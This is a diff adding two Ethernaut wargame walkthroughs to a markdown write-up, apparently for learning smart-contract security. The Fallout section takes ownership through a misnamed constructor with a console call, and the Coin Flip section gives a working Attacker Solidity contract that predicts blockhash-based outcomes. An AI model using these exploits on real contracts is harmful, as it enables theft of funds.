@@ -81,3 +81,90 @@ We'll see we are the owners now. The requirements for completing the level were 
 await contract.withdraw();
 ```
  Second Ethernaut level completed ✅
+
+## 3. Fallout 1️⃣
+> Claim ownership of the contract below to complete this level.
+> Things that might help
+> - Solidity Remix IDE
+
+This level is just looking to confuse us by making us believe that the `Fal1out()` function is the constructor of the contract:
+```solidity
+/* constructor */
+  function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  }
+```
+Prior to version 0.4.22 of Solidity, constructors were defined as functions with the same name as the contract. We could think that this is the case for this contract, but two things make us detect that this is not the case:
+- The version of the contract is ^0.6.0, so constructor can only be defined with the `constructor()` keyword 
+- The name of the function commented as "constructor" is Fal1out (it has a number 1 instead of an L), so the name of the contract is not the same as the function. Even if the contract's version was one prior to 0.4.22, this function would not work as constructor because the name of the contract and the function name are different. 
+
+In order to claim ownership of the contract, we just need to call the `Fal1out()` function:
+```javascript
+await contract.Fal1out({value: toWei("0.00000001")})
+```
+This level is a quckly reminder of how important it is to be fully focused and don't let ourselves be guided by comments when auditing code.
+
+Third Ethernaut level completed ✅
+
+## 4. Coin Flip 🪙
+>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
+> Things that might help
+> - See the Help page above, section "Beyond the console"
+
+In this challenge, we need to flip the coin 10 times and guess the correct side 10 out of 10 times in order to pass the level:
+``` solidity
+function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+```
+Things to consider: 
+- We can't trigger the `flip()` function 10 times in the same block due to the first check of the function ensuring that the current `blockValue` is different from the previously stored one.
+- If we guess correctly, `consecutiveWins` will increase for us, otherwise it'll be reset
+
+This function tries to leverage `block.value` in order to create a kind of randomness. In reality, this is not completely random, because Solidity contracts are deterministic. We can anticipate the CoinFlip contract's results and use this information to exploit it. In this case, we can easily detect which will be the value to pass to the function by creating a contract that performs the same exact calculations that the `flip()` function carries out, and then call `flip()` in the same transaction with the boolean value obtained from doing said calculations. We can build a simple contract in remix to do this:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.4;
+interface ICoinFlip {
+    function flip(bool _guess) external returns (bool);
+}
+contract Attacker {
+
+    ICoinFlip public iCoinFlip;
+
+    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+    constructor(address _coinFlip) {
+        iCoinFlip = ICoinFlip(_coinFlip);
+    }
+
+    function attack() external {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        iCoinFlip.flip(side);
+    }
+}
+```
+
+Then, we can call `attack()` 10 times (making sure we call it in a different block from the one in the previous transaction) and we'll flip the coin correctly 10 straigth times! We could also automate this using ethers.js and looping for 10 times, interacting with the contract every time a block is added to the blockchain to surpass the contract's block check.
+Fourth Ethernaut level completed ✅
